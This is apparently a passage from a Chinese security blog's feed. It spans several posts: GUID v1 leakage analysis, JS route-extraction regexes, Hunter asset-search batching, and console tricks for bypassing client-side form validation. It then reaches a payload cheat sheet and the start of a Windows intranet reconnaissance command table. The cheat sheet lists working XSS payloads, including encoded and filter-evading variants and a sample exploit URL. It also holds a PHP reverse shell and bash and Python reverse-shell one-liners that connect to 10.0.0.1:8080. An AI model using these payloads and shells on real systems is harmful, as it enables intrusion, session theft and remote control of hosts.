(13-16位)</span></span><br><span class="line">    clock_seq = ((guid.fields[<span class="number">3</span>] &amp; <span class="number">0x3FFF</span>) &lt;&lt; <span class="number">4</span>) | (guid.fields[<span class="number">4</span>] &gt;&gt; <span class="number">12</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换时间戳 (1582年起点)</span></span><br><span class="line">    base_time = datetime.datetime(<span class="number">1582</span>, <span class="number">10</span>, <span class="number">15</span>, tzinfo=datetime.timezone.utc)</span><br><span class="line">    guid_ns = (guid.time - <span class="number">0x01b21dd213814000</span>) * <span class="number">100</span></span><br><span class="line">    gen_time = base_time + datetime.timedelta(microseconds=guid_ns // <span class="number">1000</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> GUIDv1Info(timestamp=gen_time, mac=mac, clock_seq=clock_seq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sample_guid = <span class="string">&quot;c232ab00-9414-11ec-b3c4-00155d3d28d0&quot;</span>  <span class="comment"># V1 GUID</span></span><br><span class="line">    info = parse_guidv1(sample_guid)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] GUID解析结果:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;生成时间: <span class="subst">&#123;info.timestamp.isoformat()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;MAC地址: <span class="subst">&#123;info.mac&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;时钟序列: <span class="subst">&#123;info.clock_seq&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="输出示例"><a href="#输出示例" class="headerlink" title="输出示例"></a>输出示例</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[+] GUID解析结果:</span><br><span class="line">生成时间: <span class="number">2022</span>-<span class="number">02</span>-<span class="number">18</span>T08:<span class="number">15</span>:<span class="number">45</span>.<span class="number">418000</span>+<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">MAC地址: <span class="number">00</span>:<span class="number">15</span>:<span class="number">5</span>d:<span class="number">3</span>d:<span class="number">28</span>:d0</span><br><span class="line">时钟序列: <span class="number">46020</span></span><br></pre></td></tr></table></figure>

<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol>
<li><p><strong>避免使用V1</strong>：在需要隐私的场景下（如公开API、客户端ID），使用V4随机GUID</p>
</li>
<li><p><strong>敏感系统替代方案</strong>：</p>
<ul>
<li>数据库自增ID（集中式系统）</li>
<li>雪花算法（Snowflake）等时间有序但无敏感信息泄露的算法</li>
<li>ULID&#x2F;CUID等现代替代方案</li>
</ul>
</li>
<li><p><strong>必须使用时的处理</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用随机MAC替代真实MAC</span></span><br><span class="line">uuid.uuid1(node=random.getrandbits(<span class="number">48</span>) | <span class="number">0x010000000000</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="GUID版本对比"><a href="#GUID版本对比" class="headerlink" title="GUID版本对比"></a>GUID版本对比</h3><table>
<thead>
<tr>
<th align="left">版本</th>
<th align="left">描述</th>
<th align="left">安全性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">V1</td>
<td align="left">基于时间+MAC</td>
<td align="left">低（信息泄露）</td>
</tr>
<tr>
<td align="left">V2</td>
<td align="left">DCE安全版本</td>
<td align="left">中（已淘汰）</td>
</tr>
<tr>
<td align="left">V3</td>
<td align="left">基于命名空间MD5</td>
<td align="left">中（可预测）</td>
</tr>
<tr>
<td align="left">V4</td>
<td align="left">完全随机</td>
<td align="left">高（推荐）</td>
</tr>
<tr>
<td align="left">V5</td>
<td align="left">基于命名空间SHA1</td>
<td align="left">高</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>关键结论</strong>：V1 GUID因其设计特性导致严重的信息泄露风险，在现代系统中应优先使用V4随机GUID或其他隐私保护方案。如需时间有序ID，建议采用雪花算法等不包含敏感信息的替代方案。</p>
</blockquote>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>js排查pages和api</title>
    <url>/2025/05/30/js%E6%8E%92%E6%9F%A5pages%E5%92%8Capi/</url>
    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>注：这个只是为了学习原理，更好的工具推荐是F6JO大佬的bp插件<a href="https://github.com/F6JO/JsRouteScan">JsRouteScan</a></p>
<p>或者自己访问所有链接把所有js保存到同一目录，再用正则表达式提取比较全面</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>通过伪造请求头，遍历所有的src跳转链接，保存所有响应为200的js放在同一目录下，用脚本遍历js，过滤出正则表达式对应的前端目录，拼接目录进行如上循环，直到连续两次路径集合相同或达到最大迭代次数，最后对js目录提取规定的正则表达式</p>
<span id="more"></span>

<p>不足：</p>
<p>仅仅对url的目录排查和哈希路由排查，后续能力提升可能会功能进行增强</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pattern_groups = &#123;</span><br><span class="line">    <span class="string">&quot;PagePath Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;pagePath:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;pagePath:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Path Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;path:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;path:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url:\s*&quot;([^&quot;]+)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url: &quot;([^&quot;]+)&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;GET Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;get\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;get\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;POST Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;post\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;POST\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>hunter批量搜索</title>
    <url>/2025/05/09/hunter%E8%AF%AD%E6%B3%95%E6%89%B9%E9%87%8F%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>工作的时候，要求要找不同地方的同一性质的资产，为了避免麻烦，所以干脆找ai写了一个脚本，感觉蛮好用的，想着以后若是更新或者增加功能点，方便回想功能的构造，所用api为hunter，在此记录如下</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>全组合-笛卡尔积</p>
<table>
<thead>
<tr>
<th>all-body</th>
<th>domain</th>
<th>all-title</th>
<th>|body</th>
<th>title!</th>
</tr>
</thead>
<tbody><tr>
<td>河南</td>
<td>pay</td>
<td>读书</td>
<td>a</td>
<td>湖北</td>
</tr>
<tr>
<td>郑州</td>
<td>go</td>
<td>支付</td>
<td>b</td>
<td></td>
</tr>
<tr>
<td>开封</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<span id="more"></span>

<p>all-“标题”一行会与”标题”一列全组合</p>
<p>!代表减去标题；如：web.title!&#x3D;””</p>
<p>|代表括号中的或语句；如：(web.title&#x3D;”” || web.title&#x3D;””)</p>
<p>上方查询语句如下</p>
<ol>
<li>组合1**<br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;)</code> &amp;&amp; title !&#x3D; “湖北”<br>（<code>all-body</code>取”河南” + <code>all-title</code>取”读书” + 普通列<code>domain</code>取”pay”和”go” + OR列<code>body</code>取”a”或”b” + !取”湖北”）</li>
<li><strong>组合2</strong><br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code><br>（<code>all-body</code>取”河南” + <code>all-title</code>取”支付” + 其他条件同上）</li>
<li><strong>组合3</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
<li><strong>组合4</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
<li><strong>组合5</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
<li><strong>组合6</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
</ol>
<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>“””生成所有搜索组合”””</p>
<p>“””构造搜索查询语句并编码”””</p>
<p>“””发送API请求”””</p>
<p>“””处理API返回结果”””</p>
<p>“””保存为Excel文件”””</p>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>延迟访问，避免请求过快</p>
<p>查询中的反斜杠错误</p>
<p>处理json考虑返回none</p>
<p><a href="https://github.com/cliayn/hunter_batch-Surveying">https://github.com/cliayn/hunter_batch-Surveying</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>console常见命令</title>
    <url>/2025/04/29/%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h1><h4 id="简单document"><a href="#简单document" class="headerlink" title="简单document"></a>简单document</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有匹配的 input 元素</span></span><br><span class="line"><span class="keyword">const</span> inputs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> firstInputValue = inputs[<span class="number">0</span>].<span class="property">value</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第二个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> secondInputValue = inputs[<span class="number">1</span>].<span class="property">value</span>; </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>绕过前端认证提交表单的方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一</span></span><br><span class="line">如果表单有 id 或 name，可以直接提交：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">submit</span>();  <span class="comment">// 直接提交，不触发前端验证</span></span><br><span class="line"></span><br><span class="line">如果不知道 form 的选择器，可以：</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();  <span class="comment">// 提交页面第一个表单</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line">如果输入框有 required 属性，可以移除它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>).<span class="title function_">removeAttribute</span>(<span class="string">&#x27;required&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法三：</span></span><br><span class="line">在 &lt;form&gt; 上设置 novalidate 可以禁用 <span class="title class_">HTML5</span> 表单验证：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">setAttribute</span>(<span class="string">&#x27;novalidate&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法四：</span></span><br><span class="line">如果按钮有 onclick 事件阻止提交，可以覆盖它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="property">onclick</span> = <span class="literal">null</span>;</span><br><span class="line">然后手动触发点击：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="title function_">click</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法五：</span></span><br><span class="line">直接构造api：</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/submit-url&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">field1</span>: <span class="string">&quot;value1&quot;</span>,</span><br><span class="line">    <span class="attr">field2</span>: <span class="string">&quot;value2&quot;</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>console</tag>
      </tags>
  </entry>
  <entry>
    <title>payload记录</title>
    <url>/2025/04/24/payload%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p><strong>自动弹窗优先级</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video/audio &gt; details &gt; marquee &gt; math</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加载弹窗</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加密payload</span><br><span class="line">   &lt;svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line">   #svg内嵌代码1</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;animate onbegin=alert(1) attributeName=x /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码2</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;set onbegin=alert(1) /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码3</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;foreignObject onload=alert(1)&gt;&lt;/foreignObject&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #点击  # JS 协议</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line">       </span><br><span class="line">   #鼠标移动代码2</span><br><span class="line">   &lt;math&gt;</span><br><span class="line">     &lt;mtext onmouseover=alert(1)&gt;X&lt;/mtext&gt;</span><br><span class="line">   &lt;/math&gt;</span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line">   #非 常见标签</span><br><span class="line">       #万能嵌入器#早期网页：&lt;embed src=&quot;movie.swf&quot;&gt;</span><br><span class="line">       &lt;embed src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">       #详细信息</span><br><span class="line">       &lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">       #h5视频标签</span><br><span class="line">       &lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">       #h5音频标签</span><br><span class="line">       &lt;audio src=x onerror=alert(1)&gt;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>

<p>注：html解析<strong>HTML 实体编码</strong></p>
<p>​	例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;quot;   html解码成	&quot;</span><br></pre></td></tr></table></figure>

<p>注：<strong>JavaScript Unicode 转义（\uXXXX）</strong> 和 <strong>URL 编码（%XX）</strong></p>
<p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
<p>当然文件预览的方向也可以尝试</p>
<p>可以通过<a href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
<p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
<p>用ai改了一下，python3也可以用</p>
<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
<h3 id="若页面存在预览和上传"><a href="#若页面存在预览和上传" class="headerlink" title="若页面存在预览和上传"></a>若页面存在预览和上传</h3><p>则<a href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/xss/xss.pdf">xss.pdf</a></p>
<h3 id="经典示例："><a href="#经典示例：" class="headerlink" title="经典示例："></a>经典示例：</h3><h5 id="get参数变更"><a href="#get参数变更" class="headerlink" title="get参数变更"></a>get参数变更</h5><p>示例poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.xxx.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line">	解析：</span><br><span class="line"></span><br><span class="line">abc&#x27;%3breturn+false&#125;)%3b&#125;)%3balert`xss ;&lt;%2fscript&gt;</span><br></pre></td></tr></table></figure>



<h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
<p><img src="/../image/xss/expected_request.png"></p>
<h2 id="xss修复建议"><a href="#xss修复建议" class="headerlink" title="xss修复建议"></a>xss修复建议</h2><p>✅和⚠️表示仍可以优化</p>
<h3 id="①-编码与解析行为"><a href="#①-编码与解析行为" class="headerlink" title="① 编码与解析行为"></a>① 编码与解析行为</h3><ul>
<li>✅ <strong>HTML 实体会被换元（<code>&amp;#60;</code> → <code>&lt;</code>）</strong></li>
<li>❌ <strong>URL 编码不会被解析（<code>%3C</code> 不会还原）</strong></li>
<li>❌ <strong>实体不会再被二次解析</strong></li>
<li>⚠️ <strong>只有在“属性上下文”里才会被解析一次</strong></li>
</ul>
<p>👉 这么改的用途：</p>
<blockquote>
<p><strong>不存在通用 DOM 二次解析链</strong></p>
</blockquote>
<hr>
<h3 id="②-属性白名单（非常严格）"><a href="#②-属性白名单（非常严格）" class="headerlink" title="② 属性白名单（非常严格）"></a>② 属性白名单（非常严格）</h3><ul>
<li>❌ 除 <code>href</code> &#x2F; <code>src</code> 外，其余属性全部被过滤</li>
<li>❌ 所有 <code>on*</code> 事件被灭</li>
<li>❌ style &#x2F; data-* &#x2F; 自定义属性被灭</li>
</ul>
<p>👉 这是 <strong>属性级白名单 sanitizer</strong></p>
<hr>
<h3 id="③-协议与资源策略"><a href="#③-协议与资源策略" class="headerlink" title="③ 协议与资源策略"></a>③ 协议与资源策略</h3><ul>
<li>❌ <code>javascript:</code> ❌</li>
<li>❌ <code>data:</code> ❌</li>
<li>❌ URL 解码后再判断（说明是 parse 后校验）</li>
<li>⚠️ 自动链接存在（URL → <code>&lt;a&gt;</code>）</li>
<li>❌ 白名单标签</li>
</ul>
<hr>
<h3 id="④-Flash-的处理方式"><a href="#④-Flash-的处理方式" class="headerlink" title="④ Flash 的处理方式"></a>④ Flash 的处理方式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;movie.swf&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allowscriptaccess</span>=<span class="string">&quot;never&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allownetworking</span>=<span class="string">&quot;internal&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>❌<code>allowscriptaccess=&quot;never&quot;</code> → <strong>Flash 无法调用 JS</strong></li>
<li>❌<code>allownetworking=&quot;internal&quot;</code> → <strong>不能外联</strong></li>
<li>❌MIME 明确限制</li>
</ul>
<p>👉 这不是“被动过滤”，而是<strong>主动重写为安全配置</strong></p>
<h3 id="⑤-域名白名单-CSP"><a href="#⑤-域名白名单-CSP" class="headerlink" title="⑤ 域名白名单 &#x2F; CSP"></a>⑤ 域名白名单 &#x2F; CSP</h3><ul>
<li>❌只加载的官方脚本</li>
</ul>
<p>👉 防止加载外部js导致xss</p>
<h1 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8080</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>payload</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息搜集</title>
    <url>/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1 id="Windows常用搜集命令："><a href="#Windows常用搜集命令：" class="headerlink" title="Windows常用搜集命令："></a>Windows常用搜集命令：</h1><table>
<thead>
<tr>
<th align="left"><code>ipconfig /all</code></th>
<th>查询网络配置信息</th>
</tr>
</thead>
<tbody><tr>
<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</td>
<td>查询操作系统版本-中文</td>
</tr>
<tr>
<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”</td>
<td>查询操作系统版本-英文</td>
</tr>
<tr>
<td align="left">echo %PROCESSOR_ARCHITECTURE%</td>
<td>查看系统体系结构</td>
</tr>
<tr>
<td align="left">wmic product get name,version</td>
<td>安装软件版本信息</td>
</tr>
<tr>
<td align="left">powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,version”</td>
<td>收集软件版本信息</td>
</tr>
<tr>
<td align="left">wmic service list brief</td>
<td>查询本机服务信息</td>
</tr>
<tr>
<td align="left"><code>tasklist /svc</code></td>
<td>查询进程列表信息</td>
</tr>
<tr>
<td align="left">wmic startup get command,caption</td>
<td>查看启动程序信息</td>
</tr>
<tr>
<td align="left">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
